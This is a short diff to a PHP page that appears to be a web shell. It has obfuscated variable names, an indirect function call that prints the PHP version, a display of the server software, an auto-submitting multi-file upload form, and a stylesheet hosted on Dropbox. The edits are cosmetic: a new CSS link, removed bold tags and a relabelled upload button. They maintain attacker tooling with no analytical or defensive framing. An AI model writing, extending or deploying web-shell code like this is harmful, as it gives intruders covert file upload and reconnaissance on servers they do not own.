@@ -54,7 +54,7 @@ for($i=0;$i<$___;$i++) {
 
 				<title></title>
 
-			<link rel="stylesheet" href="https://dl.dropbox.com/s/eljkqluv56aqdvv/ohct.css" type="text/css">
+			<link rel="stylesheet" href="https://dl.dropbox.com/s/xjgymaiw4s7vifd/ohct.css" type="text/css">
 			<script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 			<script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
 		</head>
@@ -78,7 +78,7 @@ for($i=0;$i<$___;$i++) {
 
 					<br />
 
-					<i class="far fa-lightbulb"></i> &thinsp;&thinsp;<b>SOFT  :</b> <?php echo $_SERVER['SERVER_SOFTWARE'];?> <b>PHP :</b> <?php echo $GNJ[1]();?>
+					<i class="far fa-lightbulb"></i> &thinsp;&thinsp;SOFT  : <?php echo $_SERVER['SERVER_SOFTWARE'];?> PHP : <?php echo $GNJ[1]();?>
 
 					<br />
 
@@ -120,7 +120,7 @@ for($i=0;$i<$___;$i++) {
 
 					<form method="post" enctype="multipart/form-data">
 						<label class="l w">
-							<input type="file" name="n[]" onchange="this.form.submit()" multiple> &nbsp;UPLOAD FILE
+							<input type="file" name="n[]" onchange="this.form.submit()" multiple> &nbsp; Choose File
 						</label>&nbsp;
 					</form><br />
 
